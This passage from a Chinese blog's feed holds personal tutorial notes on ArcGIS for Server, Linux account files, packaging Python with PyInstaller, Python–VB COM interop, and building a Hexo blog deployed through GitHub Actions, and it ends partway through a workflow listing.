Service(影像服务)<ul><li>指的是将栅格数据，如遥感影像、数字高程模型DEM数据等，通过Web服务的方式提供给客户端使用（提取、分析、下载）。</li></ul></li><li>Geoprocesssing Service(地理处理服务)<ul><li>可以将自定义的各种<strong>分析处理模型</strong>发布为Web服务。（例如：找到附近1km内的加油站）</li></ul></li><li>其他类型的服务<ul><li>提供交通路网分析的网络分析服务</li><li>将文字的地址转换为地理坐标的地理编码服务</li><li>进行长度面积等各种几何计算的几何服务</li></ul></li></ul><h4 id="发布的服务需要支持地理空间服务标准（OGC-gt-WMS、WMTS、WFS、WCS、WPS-服务标准及KML规范）"><a href="#发布的服务需要支持地理空间服务标准（OGC-gt-WMS、WMTS、WFS、WCS、WPS-服务标准及KML规范）" class="headerlink" title="发布的服务需要支持地理空间服务标准（OGC =&gt; WMS、WMTS、WFS、WCS、WPS 服务标准及KML规范）"></a>发布的服务需要支持地理空间服务标准（OGC =&gt; WMS、WMTS、WFS、WCS、WPS 服务标准及KML规范）</h4><h3 id="三：规划ArcGIS-for-Service-站点"><a href="#三：规划ArcGIS-for-Service-站点" class="headerlink" title="三：规划ArcGIS for Service 站点"></a>三：规划ArcGIS for Service 站点</h3><p>完整的ArcGIS for Server安装称为创建了一个ArcGIS for Server的站点（Site），站点内包括GIS服务器、数据服务器、可选的Web Adaptor组件、客户端和人员等部分。<br><img src="//tva1.sinaimg.cn/wap720/005zbIM7ly1g8m3mbc18pj30h00h6grv.jpg" alt="图片"></p><ul><li>安装了 ArcGIS for Server 的机器可以作为 GIS 服务器</li><li>GIS服务器用来<strong>完成客户端的请求</strong>，比如绘制地图、计算路线等。</li><li>一些目录<ul><li>配置存储(config-store): 站点内所有GIS服务器和服务的属性等信息</li><li>服务器目录(server directories):包括缓存目录（arcgiscache）、作业目录（arcgisjobs）、输出目录（arcgisoutput）和系统目录（arcgissystem）</li></ul></li><li>在安装时需要创建或指定一个操作系统级别的账户，叫做ArcGIS Server账户（启动和停止服务器上的进程、读写数据、在机器间进行通信）</li></ul><h4 id="安装-GIS-Server-Account"><a href="#安装-GIS-Server-Account" class="headerlink" title="安装 GIS Server Account"></a>安装 GIS Server Account</h4><h4 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h4><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>完整的ArcGIS for Server安装称为创建了一个ArcGIS for Server的站点（Site），站点内包括GIS服务器、数据服务器、可选的Web Adaptor组件、客户端和人员等部分。最简单的部署方式是单机部署，即只使用一台计算机作为GIS服务器，比较适合一开始阶段的试用和开发人员用来调试。当单机部署的方式不能满足需求时，可以采用多机部署，即在多台机器上都安装ArcGIS for Server软件，统一作为GIS服务器来使用。</p><h3 id="四：发布及使用服务"><a href="#四：发布及使用服务" class="headerlink" title="四：发布及使用服务"></a>四：发布及使用服务</h3><h4 id="发布及使用服务"><a href="#发布及使用服务" class="headerlink" title="发布及使用服务"></a>发布及使用服务</h4><p>大致流程：在ArcGIS for Desktop中<strong>准备GIS资源</strong> –&gt; <strong>连接</strong>到ArcGIS for Server –&gt; 根据需求决定是否<strong>注册数据源</strong> –&gt; 发布前在Service Editor编辑器中进行<strong>分析</strong>–&gt; <strong>解决错误和警告</strong>–&gt; 将GIS资源<strong>发布</strong>为GIS服务。</p>]]></content>
      
      
      <categories>
          
          <category> WebGIS </category>
          
          <category> 教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebGIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux使用：Linux账号管理</title>
      <link href="/categories/Linux/Linux%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/linux%E4%BD%BF%E7%94%A8%EF%BC%9Alinux%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"/>
      <url>/categories/Linux/Linux%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/linux%E4%BD%BF%E7%94%A8%EF%BC%9Alinux%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>/etc/passwd 和 /etc/group<br><br>UDI 和 GID <br><br>1, 核实是否存在账号（查看文件 passwd,group ,有的话读取 UID 和 GID；并且读取住文件夹和 shell 设置）<br><br>2, 核对密码（/etc/shadow 找到对应的账号与 UID,核对密码）<br>3， Shell</p><p>/etc/passwd 与 /etc/shadow 必须要让系统读取。</p><ul><li>UID 系统管理员（0—） 、系统账号（1 ~ 999）、可登录账号（1000 ~ 60000）</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Linux基础教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> Linux </tag>
            
            <tag> Centos </tag>
            
            <tag> 命令 </tag>
            
            <tag> 鸟哥私房菜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 制作绿色版</title>
      <link href="/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python-%E5%88%B6%E4%BD%9C%E7%BB%BF%E8%89%B2%E7%89%88/"/>
      <url>/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python-%E5%88%B6%E4%BD%9C%E7%BB%BF%E8%89%B2%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq446252221/article/details/91044482">参考</a></p><h4 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h4><p>下载 python 安装文件,只安装 pip ,其他都取消；选个人用户而不是所有用户。<br>可以删除一下文件(夹)：</p><ul><li><strong>pycache</strong>: 用来提高脚本运行速度，不影响功能。</li><li>Script文件夹下的 pip.exe，pip3.exe 和 pip3.6.exe 功能重复</li><li>include,Libs 文件夹，时 python 的二次开发接口 SDK</li></ul><h4 id="问题：移植时-pip-不能用"><a href="#问题：移植时-pip-不能用" class="headerlink" title="问题：移植时 pip 不能用"></a>问题：移植时 pip 不能用</h4><p>1，可以更改 pip.exe 的 python 路径(改为相对路径是否可行？)<br>2，使用 python 更新 pip (<code>python -m pip install -U pip</code>)</p><span id="more"></span>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> python 常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python打包exe</title>
      <link href="/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python%E6%89%93%E5%8C%85exe/"/>
      <url>/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python%E6%89%93%E5%8C%85exe/</url>
      
        <content type="html"><![CDATA[<p>pyinstaller example.py -F -p C://…/site-packages</p><p><strong>打包出现问题</strong>:<br><code>Importing the multiarray numpy extension module failed.  Most</code></p><p><strong>解决</strong>：使用第二个方法：降低numpy版本成功(python37)</p><p>所以将两者都重新安装为适配版本就行，如下：</p><figure class="highlight plaintext"><figcaption><span>install opencv-python</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numpy==1.14.5</span><br></pre></td></tr></table></figure><p>或者可以试试只将numpy版本降低<br><code>pip install numpy==1.14.5</code></p><span id="more"></span><p>打包出来的文件很大(主要是 anaconda 的问题，几百兆。。。)，用virtualenv 创建环境。<br>-F 生成一个文件？</p><p><em>anaconda  conda activate 和 virtualenv 会互相干扰?</em></p><p><code>virtualenv -p C:\Users\K\AppData\Loca l\Programs\Python\Python36\python.exe vir_1 --no-site-packages</code></p><p>virtualenv 目录不要包含中文。</p><p>打包后在其他电脑运行出现 ：<em>无法定位程序输入点 ucrtbase.terminate</em>。</p><ul><li>pyinstaller 太旧<br>下载安装最新版本。<code>pip install https://github.com/pyinstaller/pyinstaller/archive/develop.zip</code></li><li>或者：python 太新，使用 <strong>python3.4</strong> 试试</li></ul><h3 id="VB-与-python-通信。"><a href="#VB-与-python-通信。" class="headerlink" title="VB 与 python 通信。"></a>VB 与 python 通信。</h3><h4 id="使用-com-参考"><a href="#使用-com-参考" class="headerlink" title="使用 com 参考"></a>使用 com <a href="https://www.jianshu.com/p/e60f8e057cba">参考</a></h4><ul><li>python 注册组件<ul><li>(先安装 pypiwin32：<code>pip install pywin32</code> 或者 <code>pip install pypiwin32</code>）</li><li>需要 python 5 及以上， 64位的版本，32位会提示“运行时错误 ‘ …. ‘”</li><li>excel-vba 的话， 软件是 64位 还是 32位 也会有影响吗？<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 代码</span></span><br><span class="line"><span class="keyword">import</span> pythoncom</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">PythonUtilities</span>:</span></span><br><span class="line">     _public_methods = [<span class="string">&#x27;SplitString&#x27;</span>]       <span class="comment"># 声明方法</span></span><br><span class="line">     _reg_progid_ = <span class="string">&#x27;PythonDemos.Utilities&#x27;</span>   <span class="comment"># Object名： CreateObject</span></span><br><span class="line">     _reg_clsid_ = pythoncom.CreateGuid()</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">SplitString</span>(<span class="params">self, val, item=<span class="literal">None</span></span>):</span></span><br><span class="line">         <span class="comment"># import string</span></span><br><span class="line">         <span class="keyword">if</span> item <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">             item = <span class="built_in">str</span>(item)</span><br><span class="line">         val = <span class="built_in">str</span>(val)</span><br><span class="line">         <span class="keyword">return</span> val.split(item)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;Registering COM server...&#x27;</span>)</span><br><span class="line">     <span class="keyword">import</span> win32com.server.register</span><br><span class="line">     win32com.server.register.UseCommandLine(PythonUtilities)</span><br></pre></td></tr></table></figure><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27;vb代码</span></span><br><span class="line"> <span class="keyword">Sub</span> AA()</span><br><span class="line">     <span class="keyword">Set</span> PythonUtils = CreateObject(<span class="string">&quot;PythonDemos.Utilities&quot;</span>)</span><br><span class="line">     response = PythonUtils.SplitString(<span class="string">&quot;Hello From VB&quot;</span>)</span><br><span class="line">     <span class="keyword">For</span> <span class="keyword">Each</span> Item <span class="keyword">In</span> response</span><br><span class="line">         MsgBox Item</span><br><span class="line">     <span class="keyword">Next</span></span><br><span class="line"> <span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure></li><li><strong>踩坑</strong><ul><li>不能有 <strong>init</strong> 事件？</li></ul></li></ul></li><li>vb 使用组件</li><li>python 注销组件</li></ul><h4 id="python-打包成-dll（未测试）"><a href="#python-打包成-dll（未测试）" class="headerlink" title="python 打包成 dll（未测试）"></a>python 打包成 dll（未测试）</h4><p><a href="https://blog.csdn.net/zmr1994/article/details/90703017">手把手教你将Python程序打包为DLL</a></p><p><a href="https://download.csdn.net/download/qq_35554617/11015562">C++调用Python并传参 </a></p><blockquote><blockquote><p>C#调用C++,C++调用Python并传参，包括C++向python传递图片数据，C++向python传递组数据，C++向python传递字符串数据，C++向python传递结构体数据，C++初始化python类数据并调用方法，实际案例，能直接运行，需要安装opencv和python,numpy库，实现C#控制台程序通过调用C++，、C++调用python文件动态生成数据获取返回值，并输出，</p></blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> python 常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python打包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用 GitHub+Hexo 搭建个人博客</title>
      <link href="/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E5%88%A9%E7%94%A8-github-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E5%88%A9%E7%94%A8-github-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p><strong>利用 GitHub + Hexo 搭建个人静态博客，使用 Git Action 自动发布。</strong></p><blockquote><p><a href="https://guanqr.com/study/blog/hexo-theme-next-customization/">直接看这个吧,挺全的←_←</a></p></blockquote><hr><h3 id="部署及发布-环境：windows7"><a href="#部署及发布-环境：windows7" class="headerlink" title="部署及发布(环境：windows7)"></a>部署及发布(环境：windows7)</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ul><li>下载并安装<a href="https://git-scm.com/download/win"><code>git</code></a>和<a href="https://nodejs.org/zh-cn/download/"><code>NodeJs</code></a>(NodeJs 版本需要&gt;=8，不然不能运行 hexo)</li><li>安装hexo：<br>打开cmd命令窗口，输入命令：<code>npm install -g hexo-cli</code> 下载<span id="more"></span><h4 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h4>新建并打开文件夹，<code>shift</code>+右键，打开cmd命令窗口，输入命令：  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br><span class="line">npm install</span><br><span class="line">hexo g    <span class="regexp">//</span> 生成资源文件</span><br><span class="line">hexo s    <span class="regexp">//</span> 本地运行服务：默认端口<span class="number">4000</span></span><br><span class="line"><span class="regexp">//</span>或者  hexo server -p <span class="number">5000</span>   自定义端口。</span><br></pre></td></tr></table></figure>此时通过浏览器键入网址：<code>localhost:4000</code> 可以在本地访问博客。<h4 id="发布到-github"><a href="#发布到-github" class="headerlink" title="发布到 github"></a>发布到 github</h4></li><li>登陆 github，新建仓库：<code>[username].github.io</code>。<br>注意，<code>[username]</code> 是 github 账号的用户名，比如我的仓库名应该是 <code>linxiaoki.github.io</code>。</li><li>在本地，打开之前新建的文件夹，找到文件<code>_config.yml</code>，在文件最后看到 <code>deploy:</code>，在后面添加你的仓库地址，格式如下：  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github<span class="selector-class">.com</span>:<span class="selector-attr">[username]</span>/<span class="selector-attr">[username]</span><span class="selector-class">.github</span><span class="selector-class">.io</span><span class="selector-class">.git</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure></li><li>发布: <code>shift</code>+右键，打开cmd命令窗口：  <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo g</span></span><br><span class="line"><span class="attribute">hexo d</span> </span><br></pre></td></tr></table></figure>此时浏览器访问 [username].github.io ，就可以访问了。<!-- more --></li></ul><ol start="2"><li>安装 hexo<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> -g hexo</span><br><span class="line">进入工作文件夹</span><br><span class="line">hexo init</span><br><span class="line">npm <span class="keyword">install</span></span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">[hexo s]  运行在本地服务器，可以作为测试</span><br></pre></td></tr></table></figure><h3 id="博客个性化"><a href="#博客个性化" class="headerlink" title="博客个性化"></a>博客个性化</h3></li></ol><p><strong>好了不整理了，啥时候再说吧。。。</strong></br><br><a href="https://hexo.io/zh-cn/docs/">Hexo 文档&gt;&gt;</a><br><a href="https://hexo.io/themes/">hexo 主题&gt;&gt;&gt;</a></p><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线 :)"></a>分割线 :)</h2><p>改下语言 language: zh-Hans<br>头像：themes/yilia下 新建文件夹存放图片 assets/me.png<br>配置文件：yilia/_config.yml =&gt;<br><code>avatar: /assets/me.png</code></p><h3 id="发布文章"><a href="#发布文章" class="headerlink" title="发布文章"></a>发布文章</h3><p>source/_post 添加md文件<br>source/_draft 是草稿</p><p> Front-Matter：在md 文章开头添加 <a href="https://hexo.io/zh-cn/docs/front-matter">参考</a><br> <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">题目</span></span><br><span class="line"><span class="attr">layout:</span> <span class="literal">false</span> <span class="comment"># 发布时，不会处理</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2015</span><span class="string">/7/13</span> <span class="number">10</span><span class="string">:34:33</span>  <span class="comment"># 时间</span></span><br><span class="line"><span class="comment"># 还可以 分类 和 添加标签</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure></p><p> 摘要与截断： <code>&lt;!-- more --&gt; </code> 在这之前会作为摘要，<br> 去掉more按钮：_config.yml =&gt; excerpt_link: </p><p> (未尝试)可以有模板：hexo new photo “模板”<br> 需要 scaffolds  文件夹内有 模板.md 文件？</p><p> 圆形头像<br> 右下角版权<br> <a href="https://blog.csdn.net/appleyuchi/article/details/91882571">https://blog.csdn.net/appleyuchi/article/details/91882571</a></p><h3 id="添加访问量功能"><a href="#添加访问量功能" class="headerlink" title="添加访问量功能"></a>添加访问量功能</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>使用：百度的站长统计工具、learncloud、不蒜子</p><h4 id="添加站点访问量"><a href="#添加站点访问量" class="headerlink" title="添加站点访问量"></a>添加站点访问量</h4><p><a href="https://blog.csdn.net/qq_40910541/article/details/80659193">教程：添加站点和文章访问量</a></p><ul><li><code>themes/yilia/layout/_partial/footer.ejs</code> 添加：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//把原本的footer-rignt 标签内容替换：</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;busuanzi-count&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span>=<span class="string">&quot;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;site-uv&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-user&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 本站访客数</span><br><span class="line">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;busuanzi-value&quot;</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_value_site_uv&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                  人次</span><br><span class="line">            <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;site-pv&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-eye&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 总访问量</span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;busuanzi-value&quot;</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_value_site_pv&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>次</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="添加文章访问量"><a href="#添加文章访问量" class="headerlink" title="添加文章访问量"></a>添加文章访问量</h4>换 yelee</li></ul><p> <a href="https://blog.csdn.net/DreamcoffeeZS/article/details/79401109">配置</a>—–<a href="https://dreamcoffeezs.github.io/">别人家的博客</a></p><p> GIT 库：hexo_git_source  没有添加 node_moudles 文件夹，npm install</p><h3 id="next-主题配置"><a href="#next-主题配置" class="headerlink" title="next 主题配置"></a>next 主题配置</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">语言： language: zh-CN</span><br><span class="line">双栏： scheme: Pisces</span><br><span class="line">头像：avatar: <span class="regexp">/images/</span>avatar.png</span><br><span class="line">头像，添加评论</span><br></pre></td></tr></table></figure><ul><li><p>添加访问量=&gt; 修改配置文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">eye</span></span><br><span class="line">  <span class="attr">site_uv:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>添加右下角动画</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br><span class="line"></span><br><span class="line"><span class="comment">//(黑猫，也可以选择其他动画[仓库地址](https://github.com/EYHN/hexo-helper-live2d)</span></span><br><span class="line">npm install --save live2d-widget-model-hijiki </span><br><span class="line"></span><br><span class="line"><span class="comment">// 在文件末尾 hexo 配置文件</span></span><br><span class="line"><span class="symbol">live2d:</span></span><br><span class="line"><span class="symbol">    enable:</span> true</span><br><span class="line"><span class="symbol">    scriptFrom:</span> local</span><br><span class="line"><span class="symbol">    model:</span></span><br><span class="line"><span class="symbol">        use:</span> live2d-widget-model-hijiki  <span class="comment">//对应动画</span></span><br><span class="line"><span class="symbol">    display:</span></span><br><span class="line"><span class="symbol">        position:</span> right</span><br><span class="line"><span class="symbol">        width:</span> <span class="number">200</span></span><br><span class="line"><span class="symbol">        height:</span> <span class="number">390</span></span><br><span class="line"><span class="symbol">    mobile:</span></span><br><span class="line">        false</span><br><span class="line"><span class="symbol">    react:</span></span><br><span class="line"><span class="symbol">        opacity:</span> <span class="number">0.7</span></span><br></pre></td></tr></table></figure></li><li><p>腾讯分析<br><a href="https://ta.qq.com/#/total">网址</a></p></li><li><p>取消Rss ，添加github <br><br>social github网址<br>rss: false</p></li><li><p>添加tags和categories页面<br><a href="https://github.com/iissnan/hexo-theme-next/wiki/">官方参考</a></p></li><li><p>评论<br><a href="https://zhuanlan.zhihu.com/p/76237379">utterances + next 安装</a></p></li><li><p>背景动画</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">canvas_next: </span><br><span class="line">    enable:ture</span><br><span class="line">    zindex: <span class="number">2</span></span><br><span class="line"></span><br><span class="line"> <span class="regexp">//</span>鼠标事件“穿透”动画</span><br><span class="line"><span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/</span>theme-<span class="keyword">next</span><span class="regexp">/theme-next-canvas-nest@1/</span>canvas-nest.min.js</span><br><span class="line"><span class="regexp">//</span>下载文件，放在 <span class="keyword">next</span><span class="regexp">/source/</span>js<span class="regexp">/src/</span>canvas</span><br><span class="line"> canvas_nest: <span class="regexp">/js/</span>src/canvas-nest.js</span><br><span class="line"><span class="regexp">//</span> 更改js文件：添加 style</span><br><span class="line">pointer-enents: none;</span><br></pre></td></tr></table></figure></li><li><p>next 新版本没有 custom.styl 文件怎么办: 新建，main.styl 引入<br><a href="https://blog.csdn.net/weixin_45371411/article/details/100599881">参考</a></p></li><li><p>不能显示图片?</p></li><li><p>其他：可以查看next/_config.yml文件，里面有很详细的介绍。</p></li></ul><h3 id="其他操作（2020-1-3新增）"><a href="#其他操作（2020-1-3新增）" class="headerlink" title="其他操作（2020/1/3新增）"></a>其他操作（2020/1/3新增）</h3><ul><li><p>自定义样式（配置文件的 custom_file_path: 修改)</p></li><li><p>gulp 压缩</p></li><li><p>源码部署到Netlify(可以在线编辑)</p><ul><li>页面重定向</li></ul></li></ul><h3 id="git-action-自动部署及发布"><a href="#git-action-自动部署及发布" class="headerlink" title="git action 自动部署及发布"></a>git action 自动部署及发布</h3><h4 id="仓库备份博客源码"><a href="#仓库备份博客源码" class="headerlink" title="仓库备份博客源码"></a>仓库备份博客源码</h4><p>&emsp;&emsp;可以在github上新建一个仓库 <code>hexo_source</code>，然后将仓库初始化，将主题中的<code>.git</code>文件夹删除，使用<code>git add -A</code>添加文件，并提交、推送即可。(注意：在本地部署发布时，需使用<code>npm install</code>命令下载相关包。)</p><h4 id="Git-Action-配置"><a href="#Git-Action-配置" class="headerlink" title="Git Action 配置"></a>Git Action 配置</h4><p>&emsp;&emsp;此时有两个仓库，<code>[username].github.io</code>博客发布的仓库，和<code>hexo_source</code>博客源码仓库。</p><h5 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h5><p>&emsp;&emsp;在本地运行<code>ssh-keygen -t RSA -C &quot;你的邮箱之类&quot; -f &quot;C://hexo_deploy&quot;</code>，如果提示”不是可运行的程序”，需要在<code>ssh-keygen.exe</code>文件目录下执行。生成密钥后，会发现在 C盘 根目录下多了两个文件，<code>hexo_deploy</code>和<code>hexo_deploy.pub</code>。</p><h5 id="Git-添加密钥"><a href="#Git-添加密钥" class="headerlink" title="Git 添加密钥"></a>Git 添加密钥</h5><ul><li>选择<code>hexo-source</code>仓库的设置，<code>Settine -&gt; Secrets -&gt; Add a new secret</code>，将<code>hexo_deploy</code>的内容复制到值里，并取名<code>HEXO_DEPLOY_PRIVATE_KEY</code>。</li><li>选择<code>[username].github.io</code>仓库的设置，<code>Settine -&gt; Deploy Keys -&gt; Add deploy key</code>，将<code>hexo_deploy.pub</code>的内容复制到<code>Key</code>中，勾选<code>Allow write access</code>，<code>Title</code>可以随便写。</li></ul><h5 id="Git-Action-配置-1"><a href="#Git-Action-配置-1" class="headerlink" title="Git Action 配置"></a>Git Action 配置</h5><p>在<code>hexo-source</code>仓库的Actions选项卡下点击<code>Set up a workflow yourself</code>新建工作流，配置如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 